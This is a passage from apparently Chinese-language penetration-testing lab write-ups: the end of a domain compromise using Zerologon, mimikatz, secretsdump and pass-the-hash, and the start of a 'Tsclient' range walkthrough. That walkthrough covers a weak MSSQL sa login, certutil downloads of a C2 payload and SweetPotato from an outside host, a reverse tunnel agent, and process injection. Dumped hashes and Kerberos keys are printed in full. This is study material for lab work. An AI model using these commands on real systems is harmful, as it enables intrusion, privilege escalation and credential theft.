class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">de1ay:1000:aad3b435b51404eeaad3b435b51404ee:295b75bdc039b5c4e06f05b277b9e9de:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A52/12.png"></p><p>这里抓取密码的操作</p><p>还可以rdp上去再抓取</p><p>pth测试一下</p><p>不成功</p><p>那么测试一下有没有zerologon</p><p>exp探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python zerologon_tester.py &quot;dc主机名&quot;  &lt;dc-ip&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A52/13.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\域控漏洞工具\CVE-2020-1472-master (1)\CVE-2020-1472-master&gt;python zerologon_tester.py &quot;DC&quot; 10.10.10.10</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">===============================================</span><br><span class="line">Success! DC can be fully compromised by a Zerologon attack.</span><br></pre></td></tr></table></figure><p>mimikatz探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::zerologon /target:dc.de1ay.com /account:dc$ &quot; exit</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A52/14.png"></p><p>直接开打吧</p><p>用exp或者mimikatz都行</p><p><img src="/img/%E7%BA%A2%E6%97%A52/15.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::zerologon /target:dc.de1ay.com /account:dc$ /exploit&quot; exit</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%BA%A2%E6%97%A52/16.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py de1ay/DC$@10.10.10.10 -no-pass</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\impacket-0.12.0\examples&gt;python secretsdump.py de1ay/DC$@10.10.10.10 -no-pass</span><br><span class="line">Impacket v0.9.23 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::</span><br><span class="line">de1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">de1ay.com\mssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::</span><br><span class="line">DC$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">PC$:1105:aad3b435b51404eeaad3b435b51404ee:6027e8c8c05de6aea03654edafa68ddd:::</span><br><span class="line">WEB$:1603:aad3b435b51404eeaad3b435b51404ee:2fdf3b298c90c57197843084a5d16891:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:42e65a58c000dab8d353b1ff2bee93383f27f0966767afa8c1f32fc51122d118</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:5eb13d2a0e1f4980c3e3810d5da3da4f</span><br><span class="line">krbtgt:des-cbc-md5:79c8dc79fe467552</span><br><span class="line">de1ay:aes256-cts-hmac-sha1-96:22df3e763a8d931afea3c8ca499d7d9b7474248b2bf69deac58418f5c6ac899d</span><br><span class="line">de1ay:aes128-cts-hmac-sha1-96:d0f0c418eb1a4c4a13227ed06b56a8fc</span><br><span class="line">de1ay:des-cbc-md5:5b375d8a1016d613</span><br><span class="line">de1ay.com\mssql:aes256-cts-hmac-sha1-96:6dd445adefa385cc6484e2a8c8952be5da579a3664395d3d729c7e577a8b8009</span><br><span class="line">de1ay.com\mssql:aes128-cts-hmac-sha1-96:047129868012d63377c7f3ee61a16999</span><br><span class="line">de1ay.com\mssql:des-cbc-md5:94bf7f5476298957</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:29f6a21d200df44d9da2c97116366221413e9df069b0b18280edda219be2bf5e</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:51d30bc397120a95fa66c429dbf9c010</span><br><span class="line">DC$:des-cbc-md5:04f40d04da3df154</span><br><span class="line">PC$:aes256-cts-hmac-sha1-96:b5b7ecc7fa445533b8db5123ba51ccec265eca367d87aed4dade315c3f4d88ac</span><br><span class="line">PC$:aes128-cts-hmac-sha1-96:5cc6c45b37c094af15bd547dd8dde87b</span><br><span class="line">PC$:des-cbc-md5:296b4a153d2ffdb3</span><br><span class="line">WEB$:aes256-cts-hmac-sha1-96:3f77e0873abbb2feccd941041821f0f8d8403294018537cc0f9ba24f758c54fd</span><br><span class="line">WEB$:aes128-cts-hmac-sha1-96:e8d8bd8dbccae433cfc7e1dcf6daff41</span><br><span class="line">WEB$:des-cbc-md5:92e69b107576c198</span><br><span class="line">[*] Cleaning up...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用cs的pth直接正向上线拿下</p><p><img src="/img/%E7%BA%A2%E6%97%A52/17.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.0.102  10.10.10.80 (已拿下)  WEB.de1ay.com   [weblogic]   Windows Server 2008 R2 Standard 7601 Service Pack 1</span><br><span class="line">10.10.0.103  10.10.10.201  PC  拿下</span><br><span class="line">10.10.10.10  DC.de1ay.com  DC.de1ay.com</span><br></pre></td></tr></table></figure><p>同理</p><p><img src="/img/%E7%BA%A2%E6%97%A52/18.png"></p><p>50分钟拿下</p><p>总结</p><p>weblogic一把梭拿shell——》ms14-058提权——》抓取密码尝试横向，未成功——》探测域控漏洞——》zerologon    cve-2020-1472置空密码——》hashdump <font style="color:rgb(51, 51, 51);">导出域内所有用户的凭证——》pth横向域控、pc</font></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Tsclient</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.c1trus.top/37-%E9%9D%B6%E6%9C%BAwp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF/tsclient.html">https://www.c1trus.top/37-%E9%9D%B6%E6%9C%BAwp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF/tsclient.html</a></p><p>开局一个ip</p><p>我们老样子，先扫常见端口</p><p>39.99.131.64</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan火绒<span class="number">6.0</span>免杀版\未免杀<span class="number">5</span>号黯区红队开发的fscan图形化和plus&gt;fscan.exe <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">131.64</span></span><br><span class="line"></span><br><span class="line">  ______                   _____  _</span><br><span class="line"> |  ____|                 |  __ \| |</span><br><span class="line"> | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___</span><br><span class="line"> |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __|</span><br><span class="line"> | |  \__ \ (_| (_| | | | | |    | | |_| \__ \</span><br><span class="line"> |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/</span><br><span class="line">                     fscan version: <span class="number">1.8</span>.<span class="number">4</span> TeamdArk5 v1.<span class="number">0</span></span><br><span class="line"><span class="built_in">start</span> infoscan</span><br><span class="line"><span class="number">39.99</span>.<span class="number">131.64</span>:<span class="number">1433</span> open</span><br><span class="line">[*] alive ports len is: <span class="number">1</span></span><br><span class="line"><span class="built_in">start</span> vulscan</span><br><span class="line">[+] mssql <span class="number">39.99</span>.<span class="number">131.64</span>:<span class="number">1433</span>:sa <span class="number">1</span>qaz!QAZ</span><br><span class="line">已完成 <span class="number">1</span>/<span class="number">1</span></span><br><span class="line">[*] 扫描结束,耗时: <span class="number">17.3737851</span>s</span><br></pre></td></tr></table></figure><p>扫的有点不全，但是不影响我们getshell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">39.99</span>.<span class="number">131.64</span>                    mssql        弱口令 sa <span class="number">1</span>qaz!QAZ</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/1.png"></p><p>连接成功，接下来查看一下xp_cmpshell开没开</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/2.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/3.png"></p><p>可以看到仅为mssqlserver权限</p><p>上线cs</p><p>先启动cs，再文件托管将a.exe上传到靶机</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-f</span> <span class="operator">-split</span> <span class="literal">-urlcache</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8080</span>/a.exe C:\Users\Public\a.exe</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/4.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/5.png"></p><p>成功上线</p><p>信息收集一下</p><p>直接看土豆家族是否能提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">11</span>] beacon&gt; shell whoami /priv</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">11</span>] [*] Tasked beacon to run: whoami /priv</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">17</span>] [+] host called home, sent: <span class="number">75</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">17</span>:<span class="number">18</span>] [+] received output:</span><br><span class="line"></span><br><span class="line">特权信息</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">特权名                        描述                 状态  </span><br><span class="line">============================= ==================== ======</span><br><span class="line">SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用</span><br><span class="line">SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用</span><br><span class="line">SeChangeNotifyPrivilege       绕过遍历检查         已启用</span><br><span class="line">SeImpersonatePrivilege        身份验证后模拟客户端 已启用</span><br><span class="line">SeCreateGlobalPrivilege       创建全局对象         已启用</span><br><span class="line">SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SeImpersonatePrivilege        身份验证后模拟客户端 已启用</p><p>有这个权限</p><p>上传SweetPotato进行提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-f</span> <span class="operator">-split</span> <span class="literal">-urlcache</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8080</span>/SweetPotato.exe C:\Users\Public\SweetPotato.exe</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/6.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Users\Public\SweetPotato.exe <span class="literal">-a</span> C:\Users\Public\a.exe</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/7.png"></p><p>提权成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/8.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/9.png"></p><p>接下来进行内网信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">54</span>] beacon&gt; shell ipconfig <span class="literal">-all</span></span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">54</span>] [*] Tasked beacon to run: ipconfig <span class="literal">-all</span></span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">54</span>] [+] host called home, sent: <span class="number">44</span> bytes</span><br><span class="line">[<span class="number">05</span>/<span class="number">30</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">55</span>] [+] received output:</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line">   主机名  . . . . . . . . . . . . . : WIN<span class="literal">-WEB</span></span><br><span class="line">   主 DNS 后缀 . . . . . . . . . . . : </span><br><span class="line">   节点类型  . . . . . . . . . . . . : 混合</span><br><span class="line">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class="line">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter</span><br><span class="line">   物理地址. . . . . . . . . . . . . : <span class="number">00</span><span class="literal">-16-3E-28-AD-AF</span></span><br><span class="line">   DHCP 已启用 . . . . . . . . . . . : 是</span><br><span class="line">   自动配置已启用. . . . . . . . . . : 是</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">402</span>:<span class="number">1</span>e2a:<span class="number">6</span>e40:be5f%<span class="number">14</span>(首选) </span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : <span class="number">172.22</span>.<span class="number">8.18</span>(首选) </span><br><span class="line">   子网掩码  . . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">0.0</span></span><br><span class="line">   获得租约的时间  . . . . . . . . . : <span class="number">2025</span>年<span class="number">5</span>月<span class="number">30</span>日 <span class="number">10</span>:<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">   租约过期的时间  . . . . . . . . . : <span class="number">2038</span>年<span class="number">1</span>月<span class="number">19</span>日 <span class="number">11</span>:<span class="number">14</span>:<span class="number">08</span></span><br><span class="line">   默认网关. . . . . . . . . . . . . : <span class="number">172.22</span>.<span class="number">255.253</span></span><br><span class="line">   DHCP 服务器 . . . . . . . . . . . : <span class="number">172.22</span>.<span class="number">255.253</span></span><br><span class="line">   DHCPv6 IAID . . . . . . . . . . . : <span class="number">50337342</span></span><br><span class="line">   DHCPv6 客户端 DUID  . . . . . . . : <span class="number">00</span><span class="literal">-01-00-01-2F-CA-CB-58-00-16-3E-28-AD-AF</span></span><br><span class="line">   DNS 服务器  . . . . . . . . . . . : <span class="number">100.100</span>.<span class="number">2.136</span></span><br><span class="line">                                       <span class="number">100.100</span>.<span class="number">2.138</span></span><br><span class="line">   TCPIP 上的 NetBIOS  . . . . . . . : 已启用</span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;E309DFD0<span class="literal">-37D7-4E89-A23A-3C61210B34EA</span>&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter</span><br><span class="line">   物理地址. . . . . . . . . . . . . : <span class="number">00</span><span class="literal">-00-00-00-00-00-00-E0</span></span><br><span class="line">   DHCP 已启用 . . . . . . . . . . . : 否</span><br><span class="line">   自动配置已启用. . . . . . . . . . : 是</span><br><span class="line"></span><br><span class="line">隧道适配器 Teredo Tunneling Pseudo<span class="literal">-Interface</span>:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   描述. . . . . . . . . . . . . . . : Teredo Tunneling Pseudo<span class="literal">-Interface</span></span><br><span class="line">   物理地址. . . . . . . . . . . . . : <span class="number">00</span><span class="literal">-00-00-00-00-00-00-E0</span></span><br><span class="line">   DHCP 已启用 . . . . . . . . . . . : 否</span><br><span class="line">   自动配置已启用. . . . . . . . . . : 是</span><br><span class="line">   IPv6 地址 . . . . . . . . . . . . : <span class="number">2001</span>:<span class="number">0</span>:<span class="number">348</span>b:fb58:<span class="number">845</span>:<span class="number">161</span>:d89c:<span class="number">7</span>cbf(首选) </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::<span class="number">845</span>:<span class="number">161</span>:d89c:<span class="number">7</span>cbf%<span class="number">12</span>(首选) </span><br><span class="line">   默认网关. . . . . . . . . . . . . : ::</span><br><span class="line">   DHCPv6 IAID . . . . . . . . . . . : <span class="number">134217728</span></span><br><span class="line">   DHCPv6 客户端 DUID  . . . . . . . : <span class="number">00</span><span class="literal">-01-00-01-2F-CA-CB-58-00-16-3E-28-AD-AF</span></span><br><span class="line">   TCPIP 上的 NetBIOS  . . . . . . . : 已禁用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整理一下，看见了172.22.8.18&#x2F;24这个网段</p><p>上传fscan进行探测</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-f</span> <span class="operator">-split</span> <span class="literal">-urlcache</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8080</span>/fscan.exe C:\Users\Public\fscan.exe</span><br></pre></td></tr></table></figure><p>防止防火墙禁止icmp协议</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell fscan.exe <span class="literal">-h</span> <span class="number">172.22</span>.<span class="number">8.18</span>/<span class="number">24</span> <span class="literal">-np</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>:<span class="number">80</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>:<span class="number">135</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>:<span class="number">139</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>:<span class="number">445</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">1433</span> open</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>:<span class="number">88</span> open</span><br><span class="line">[*] WebTitle http://<span class="number">172.22</span>.<span class="number">8.18</span>        code:<span class="number">200</span> len:<span class="number">703</span>    title:IIS Windows Server</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">8.15</span></span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">8.15</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">8.18</span></span><br><span class="line">   [-&gt;]WIN<span class="literal">-WEB</span></span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">8.18</span></span><br><span class="line">   [-&gt;]<span class="number">2001</span>:<span class="number">0</span>:<span class="number">348</span>b:fb58:<span class="number">845</span>:<span class="number">161</span>:d89c:<span class="number">7</span>cbf</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">8.31</span></span><br><span class="line">   [-&gt;]WIN19<span class="literal">-CLIENT</span></span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">8.31</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span>.<span class="number">8.46</span></span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]<span class="number">172.22</span>.<span class="number">8.46</span></span><br><span class="line">[*] NetBios <span class="number">172.22</span>.<span class="number">8.46</span>     WIN2016.xiaorang.lab                Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span></span><br><span class="line">[*] NetBios  <span class="number">172.22</span>.<span class="number">8.31</span>     XIAORANG\WIN19<span class="literal">-CLIENT</span>          Windows Version <span class="number">10.0</span> Build <span class="number">17763</span></span><br><span class="line">[*] NetBios  <span class="number">172.22</span>.<span class="number">8.15</span>     [+] DC:XIAORANG\DC01            Windows Version <span class="number">10.0</span> Build <span class="number">20348</span></span><br><span class="line">[*] WebTitle http://<span class="number">172.22</span>.<span class="number">8.46</span>        code:<span class="number">200</span> len:<span class="number">703</span>    title:IIS Windows Server</span><br><span class="line">[+] mssql <span class="number">172.22</span>.<span class="number">8.18</span>:<span class="number">1433</span>:sa <span class="number">1</span>qaz!QAZ</span><br><span class="line">[*] NetBios <span class="number">172.22</span>.<span class="number">8.18</span>     WIN<span class="literal">-WEB</span>              Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在扫的同时挂隧道代理</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-f</span> <span class="operator">-split</span> <span class="literal">-urlcache</span> http://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">8080</span>/stowaway_windows/windows_x64_agent.exe C:\Users\Public\windows_x64_agent.exe</span><br><span class="line"></span><br><span class="line">linux_x64_admin <span class="literal">-l</span> <span class="number">1122</span></span><br><span class="line"></span><br><span class="line">windows_x64_agent.exe <span class="literal">-c</span> <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1122</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/10.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/11.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/12.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/13.png"></p><p>那么我们来整理一下资产吧</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">39.99</span>.<span class="number">131.64</span>   <span class="number">172.22</span>.<span class="number">8.18</span> 已拿下                mssql        弱口令 sa <span class="number">1</span>qaz!QAZ</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span>     [+] DC:XIAORANG\DC01</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span>     XIAORANG\WIN19<span class="literal">-CLIENT</span> </span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>     WIN2016.xiaorang.lab</span><br></pre></td></tr></table></figure><p>信息收集一下</p><p>查看有无在线用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/14.png"></p><p>使用进程注入拿到这个用户的shell</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/15.png"></p><p>查看挂载情况</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br></pre></td></tr></table></figure><p><img 